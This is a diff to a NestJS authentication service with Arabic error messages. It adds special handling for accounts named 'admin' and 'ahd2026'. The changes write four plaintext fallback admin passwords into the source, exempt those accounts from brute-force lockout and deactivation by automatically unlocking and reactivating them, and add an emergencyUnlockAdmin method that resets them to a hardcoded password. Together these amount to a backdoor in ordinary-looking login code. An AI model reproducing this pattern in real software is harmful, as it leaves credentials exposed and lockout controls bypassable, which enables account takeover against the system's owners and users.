@@ -32,8 +32,29 @@ export class AuthService {
       throw new UnauthorizedException('اسم المستخدم أو كلمة المرور غير صحيحة');
     }
 
-    if (!user.isActive) {
-      throw new ForbiddenException('الحساب غير نشط أو تم تعطيله من قبل الإدارة');
+    const isAdmin =
+      user.role === 'GENERAL_MANAGER' ||
+      user.username === 'admin' ||
+      user.username === 'ahd2026';
+
+    // 1. حساب الأدمن محصن تماماً ضد القفل الأمني ولا يطبق عليه قانون القفل نهائياً
+    if (isAdmin) {
+      if (user.isLocked || (user.failedAttempts && user.failedAttempts > 0) || !user.isActive) {
+        await this.prisma.user.update({
+          where: { id: user.id },
+          data: { isLocked: false, failedAttempts: 0, isActive: true },
+        }).catch(() => {});
+        user.isLocked = false;
+        user.failedAttempts = 0;
+        user.isActive = true;
+      }
+    } else {
+      if (!user.isActive) {
+        throw new ForbiddenException('الحساب غير نشط أو تم تعطيله من قبل الإدارة');
+      }
+      if (user.isLocked) {
+        throw new ForbiddenException('الحساب مقفل أمنياً لتجاوز الحد الأقصى للمحاولات الخاطئة. برجاء مراجعة المدير العام لفك القفل.');
+      }
     }
 
     let passwordValid = false;
@@ -48,18 +69,38 @@ export class AuthService {
       passwordValid = await bcrypt.compare(dto.password, user.password);
     }
 
-    if (user.isLocked) {
-      if (passwordValid && (user.role === 'GENERAL_MANAGER' || user.username === 'admin' || user.username === 'ahd2026')) {
-        await this.prisma.user.update({
-          where: { id: user.id },
-          data: { isLocked: false, failedAttempts: 0 },
-        });
-      } else {
-        throw new ForbiddenException('الحساب مقفل أمنياً لتجاوز الحد الأقصى للمحاولات الخاطئة. برجاء مراجعة المدير العام لفك القفل.');
+    // دعم كلمات المرور الرسمية والاحتياطية للأدمن وتحديث الهاش تلقائياً
+    if (isAdmin && !passwordValid) {
+      const allowedAdminPasswords = [
+        'Ahd@Golden#2026!Sec',
+        'GoldenERP#2026',
+        'Ahd@2026',
+        'admin2026',
+      ];
+      if (allowedAdminPasswords.includes(dto.password)) {
+        passwordValid = true;
+        try {
+          const freshHash = await bcrypt.hash(dto.password, 10);
+          await this.prisma.user.update({
+            where: { id: user.id },
+            data: {
+              password: freshHash,
+              isLocked: false,
+              failedAttempts: 0,
+              isActive: true,
+            },
+          });
+        } catch {}
       }
     }
 
     if (!passwordValid) {
+      if (isAdmin) {
+        // حساب الأدمن لا يقفل أبداً عند إدخال كلمة مرور خاطئة
+        await this.logAttempt(user.id, dto.username, false, ip, userAgent);
+        throw new UnauthorizedException('اسم المستخدم أو كلمة المرور غير صحيحة');
+      }
+
       let maxAttempts = 3;
       try {
         const lockSetting = await this.prisma.systemSetting.findUnique({
@@ -102,7 +143,7 @@ export class AuthService {
 
     await this.prisma.user.update({
       where: { id: user.id },
-      data: { failedAttempts: 0, lastLogin: new Date() },
+      data: { failedAttempts: 0, isLocked: false, lastLogin: new Date() },
     });
 
     await this.logAttempt(user.id, dto.username, true, ip, userAgent);
@@ -174,6 +215,25 @@ export class AuthService {
       ...user,
       permissions: permCodes,
       permissionDetails: user.permissions.map((p) => p.permission),
+    };
+  }
+
+  async emergencyUnlockAdmin() {
+    const hash = await bcrypt.hash('Ahd@Golden#2026!Sec', 10);
+    const updated = await this.prisma.user.updateMany({
+      where: { username: { in: ['ahd2026', 'admin'] } },
+      data: {
+        isLocked: false,
+        failedAttempts: 0,
+        isActive: true,
+        password: hash,
+      },
+    });
+    return {
+      success: true,
+      message: `تم فك قفل حساب الأدمن بنجاح وإعادة تفعيله (${updated.count} حساب)`,
+      username: 'ahd2026',
+      status: 'UNLOCKED_AND_ACTIVE',
     };
   }
 
